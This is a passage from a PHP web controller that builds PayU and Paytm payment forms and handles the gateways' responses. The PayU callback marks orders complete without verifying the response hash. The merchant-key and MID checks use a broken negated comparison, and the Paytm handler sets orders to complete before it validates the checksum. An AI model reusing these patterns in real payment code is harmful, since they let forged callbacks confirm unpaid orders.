			$method = $this->PaymentModel->getPaymentMethod(array('id'=>$record->method_id,'admin_id'=>CLIENT_ID));
			if($method->num_rows())
			{	
				$method = $method->row();
                $_POST = array('amount'=>$record->txn_amount);
            
            
            
            $MERCHANT_KEY = $method->key2;  // merchant key
            $SALT = $method->key1;  // salt key
            $PAYU_BASE_URL = "https://secure.payu.in";
            $action = '';
            $posted = array();
            $txnid = substr(hash('sha256', mt_rand() . microtime()), 0, 20);
            if(!empty($_POST)) {
            		$posted['amount'] = $_POST['amount'];
            		$posted['phone'] = '';
            		$posted['firstname'] = '';
            		$posted['email'] = '';
            		$posted['key'] = $MERCHANT_KEY;
            		$posted['txnid'] = $txnid;
            		$posted['productinfo'] = 'website';
            		$posted['surl'] = site_url('Home/payu-transaction-response');
            		$posted['furl'] = site_url('Home/payu-transaction-response');
            		$posted['curl'] = site_url('Home/payu-transaction-response');
            		$posted['service_provider'] = 'payu_paisa';
            		$posted['udf1']     =   $record->order_id;
                    $posted['udf2']     =   $record->customer_id;
            }
            $hash = '';
            $hashSequence = "key|txnid|amount|productinfo|firstname|email|udf1|udf2|udf3|udf4|udf5|udf6|udf7|udf8|udf9|udf10";
            
            if(empty($posted['hash']) && sizeof($posted) > 0) {
            	if(
            			  empty($posted['key'])
            			  || empty($posted['txnid'])
            			  || empty($posted['amount'])
            			  || empty($posted['productinfo'])
            			  || empty($posted['surl'])
            			  || empty($posted['furl'])
            			  || empty($posted['service_provider'])
            	  ) {
            		echo "Fail";
            		//redirect('payumoney/');
            	  }
            	else{
            		
            		$hashVarsSeq = explode('|', $hashSequence);
            		$hash_string = '';
            		foreach($hashVarsSeq as $hash_var){
            			  $hash_string .= isset($posted[$hash_var]) ? $posted[$hash_var] : '';
            			  $hash_string .= '|';
            		}
            
            		$hash_string .= $SALT;
            		$hash = strtolower(hash('sha512', $hash_string));
            		$posted['hash'] = $hash;
            		$action = $PAYU_BASE_URL . '/_payment';
            	}
            }
            elseif(!empty($posted['hash'])){
              $hash = $posted['hash'];
              $action = $PAYU_BASE_URL . '/_payment';
            }
            ?>
            <!DOCTYPE html>
            <html>
            <head>
            <script>
                var hash = '<?php echo $hash ?>';
                function submitPayuForm() {
                 if(hash == '') {
                    return;
                  }
                  var payuForm = document.forms.payuForm;
                  payuForm.submit();
                }
             </script>
            </head>
            <body onload="submitPayuForm()" style="display:none">
            
            			<form method="post" class="form-horizontal" action="<?php echo $action; ?>" name="payuForm">
            
            				<input type="hidden" name="key" value="<?php echo (!isset($posted['key'])) ? '' : $posted['key'] ?>" />
            				<input type="hidden" id="hash" name="hash" value="<?php echo (!isset($posted['hash'])) ? '' : $posted['hash'] ?>"/>
            				<input type="hidden" name="txnid" value="<?php echo (!isset($posted['txnid'])) ? '' : $posted['txnid'] ?>" />
            
                            <input type="hidden" name="udf1" value="<?php echo (!isset($posted['udf1'])) ? '' : $posted['udf1'] ?>" />
                            <input type="hidden" name="udf2" value="<?php echo (!isset($posted['udf2'])) ? '' : $posted['udf2'] ?>" />
                            
                            
            				<input type="hidden" name="productinfo" id="productinfo" value="<?php echo (!isset($posted['productinfo'])) ? '' : $posted['productinfo'] ?>">
            				<input type="hidden" name="surl" value="<?php echo (!isset($posted['surl'])) ? '' : $posted['surl'] ?>" size="64" />
            				<input type="hidden" name="curl" value="<?php echo (!isset($posted['curl'])) ? '' : $posted['curl'] ?>" size="64" />
            				<input type="hidden" id="furl" name="furl" value="<?php echo (!isset($posted['furl'])) ? '' : $posted['furl'] ?>" size="64" />
            				<input type="hidden" name="service_provider" value="<?php echo (!isset($posted['service_provider'])) ? '' : $posted['service_provider'] ?>" size="64" />
            
            				<input type="text" class="form-control" name="firstname" id="firstname" placeholder="Your Name" value="<?php echo (!isset($posted['firstname'])) ? '' : $posted['firstname'] ?>">
            			
            				      <input type="email" name="email" id="email" class="form-control" placeholder="Your Email" value="<?php echo (!isset($posted['email'])) ? '' : $posted['email'] ?>" >
            			
            				      <input type="text" name="phone" class="form-control" id="inputPassword3" placeholder="Your Mobile Number" value="<?php echo (!isset($posted['phone'])) ? '' : $posted['phone'] ?>" >
            		
            				      <input type="number" name="amount" class="form-control" id="inputPassword3" placeholder="Amount to Pay" value="<?php echo (!isset($posted['amount'])) ? '' : $posted['amount'] ?>" required>
            			
            				      <button type="submit" class="btn btn-primary">Click To Pay</button>
            	
            			</form>
            </body>
            </html>
            <?php
			}
		}
	}
	function payu_transaction_response(){
	    
		    if($post = $this->input->post())
    		{
    		    
    			$rec = $this->PaymentModel->getTransactionRecord(array('order_id'=>$_POST['udf1']));
    			if($rec->num_rows())
    			{
    				
    				$record = $rec->row();
    				// =========== Updating Record Details =========
    
    					$newData = array('status'=>'complete');
    
    					$this->PaymentModel->updateTransactionRecord(array('id'=>$record->id),$newData);
    
    
    				$method = $this->PaymentModel->getPaymentMethod(array('id'=>$record->method_id,'admin_id'=>CLIENT_ID));
    				if($method->num_rows())
    				{	
    					$method = $method->row();
    
    					if(!$method->key1==$post['key'])
    					{
    						echo'MERCHANT key mismatch'; exit();
    					}
    							//========================= Adding Final Transaction State ==============
    
    					if($post["status"])
    					{
    						$final = array('order_id'=>$post['udf1'],
    												'txn_id'=>isset($post['txnid'])?$post['txnid']:"",
    												'txn_amount'=>$post['amount'],
    												'currency'=>isset($post['CURRENCY'])?$post['CURRENCY']:'',
    												'status'=>$post['status'],
    												'resp_code'=>isset($post['RESPCODE'])?$post['RESPCODE']:'',
    												'resp_msg'=>$post['field9'],
    												'bank_txn_id'=>'',
    												'payment_method' => 'payumoney',
    												'admin_id'=>CLIENT_ID,
    											);
    						$this->PaymentModel->addFinalTransaction($final);
    					}
    
    					//======================================================================
    
    					$this->load->view('transaction_response',['response'=>$post]);
    
    				}
    			}
    
    		}
    		else
    		    redirect(base_url);
	}
	function paytm_transaction($recordid)
	{
		header("Pragma: no-cache");
		header("Cache-Control: no-cache");
		header("Expires: 0");
	//	echo'Please Wait.... Do not Refrest The Page.';	
	    $this->load->view('includes/full_page_loader');
	    
		$recid = AJ_DECODE($recordid);
		$rec = $this->PaymentModel->getTransactionRecord(array('id'=>$recid,'status'=>'init'));
		if($rec->num_rows())
		{
			$record = $rec->row();
			$method = $this->PaymentModel->getPaymentMethod(array('id'=>$record->method_id,'admin_id'=>CLIENT_ID));
			if($method->num_rows())
			{	
				$method = $method->row();

				define('CUSTOM_DEFINE_KEY1', $method->key1);
				define('CUSTOM_DEFINE_KEY2', $method->key2);
				define('CUSTOM_DEFINE_WEBSITE', 'DEFAULT');

				$this->load->helper('encdec_paytm');
				$this->load->helper('config_paytm');

				$checkSum = "";
				$paramList = array();

				$ORDER_ID = $record->order_id;
				$CUST_ID =  $record->customer_id;
				$INDUSTRY_TYPE_ID = 'Retail';
				$CHANNEL_ID = 'WEB';
				$TXN_AMOUNT = $record->txn_amount;

				// Create an array having all required parameters for creating checksum.
				$paramList["MID"] = PAYTM_MERCHANT_MID;
				$paramList["ORDER_ID"] = $ORDER_ID;
				$paramList["CUST_ID"] = $CUST_ID;
				$paramList["INDUSTRY_TYPE_ID"] = $INDUSTRY_TYPE_ID;
				$paramList["CHANNEL_ID"] = $CHANNEL_ID;
				$paramList["TXN_AMOUNT"] = $TXN_AMOUNT;
				$paramList["WEBSITE"] = 'DEFAULT';
				$paramList["CALLBACK_URL"] = site_url('Home/paytm-transaction-response');


				$checkSum = getChecksumFromArray($paramList,PAYTM_MERCHANT_KEY);
				// print_r($paramList);
				// exit();
				echo'<form method="post" action="'.PAYTM_TXN_URL.'" name="f1">
							<tbody>';
							foreach($paramList as $name => $value) {
								echo '<input type="hidden" name="' . $name .'" value="' . $value . '">';
							}
							
							echo'<input type="hidden" name="CHECKSUMHASH" value="'.$checkSum.'">
						
						<script type="text/javascript">
							document.f1.submit();
						</script>
					</form>';

			}
		}
	}

	function paytm_transaction_response()
	{		
		if($post = $this->input->post())
		{
			$rec = $this->PaymentModel->getTransactionRecord(array('order_id'=>$_POST['ORDERID']));
			if($rec->num_rows())
			{
				
				$record = $rec->row();

				// =========== Updating Record Details =========

					$newData = array('status'=>'complete');

					$this->PaymentModel->updateTransactionRecord(array('id'=>$record->id),$newData);
				//===========================================

					if($_POST['RESPCODE']=='330')
					{
						echo'Invalid Merchant Key or Merchant ID<br>';
						
						print_r($_POST);
						exit();
					}


				$method = $this->PaymentModel->getPaymentMethod(array('id'=>$record->method_id,'admin_id'=>CLIENT_ID));
				if($method->num_rows())
				{	
					$method = $method->row();

					if(!$method->key1==$post['MID'])
					{
						echo'MID mismatch'; exit();
					}

					define('CUSTOM_DEFINE_KEY1', $method->key1);
					define('CUSTOM_DEFINE_KEY2', $method->key2);
					define('CUSTOM_DEFINE_WEBSITE', 'DEFAULT');

					$this->load->helper('encdec_paytm');
					$this->load->helper('config_paytm');


					$paytmChecksum = "";
					$paramList = array();
					$isValidChecksum = "FALSE";

					$paramList = $_POST;
					$paytmChecksum = isset($_POST["CHECKSUMHASH"]) ? $_POST["CHECKSUMHASH"] : ""; //Sent by Paytm pg

					//Verify all parameters received from Paytm pg to your application. Like MID received from paytm pg is same as your application’s MID, TXN_AMOUNT and ORDER_ID are same as what was sent by you to Paytm PG for initiating transaction etc.
					$isValidChecksum = verifychecksum_e($paramList, PAYTM_MERCHANT_KEY, $paytmChecksum); //will return TRUE or FALSE string.

					if($isValidChecksum)
					{
							//========================= Adding Final Transaction State ==============

							if($post["STATUS"])
							{
								$final = array('order_id'=>$post['ORDERID'],
												'txn_id'=>isset($post['TXNID'])?$post['TXNID']:"",
												'txn_amount'=>$post['TXNAMOUNT'],
												'currency'=>$post['CURRENCY'],
												'status'=>$post['STATUS'],
												'resp_code'=>$post['RESPCODE'],
												'resp_msg'=>$post['RESPMSG'],
												'bank_txn_id'=>$post['BANKTXNID'],
												'payment_method' => 'paytm',
												'admin_id'=>CLIENT_ID,
											);
								$this->PaymentModel->addFinalTransaction($final);
							}

							//======================================================================

							$this->load->view('transaction_response',['response'=>$post]);
					}
					else
					{
						echo'CHECKSUMHASH mismatch'; exit();
					}

				}
			}

		}
		else
    		redirect(base_url);
	}

	function file_service($service_id)
	{	
		$service_id = ($service_id);
        // echo $service_id;
        // exit;
		if($post = $this->input->post())
		{
			$key = json_encode($post);
			
			$res = $this->ServiceModel->findFile($key,$service_id);

			if($res->num_rows())
			{
				$download = $this->ServiceModel->getFileService(array('id'=>$service_id))->row()->download_permission;
				$file = $res->row()->file;
				$link = site_url().'public/temp/'.CLIENT_ID.'/'.$file;
				echo json_encode(array('link'=>$link,'download'=>$download));

			}
			else
				echo'0';
		}
	}

	
}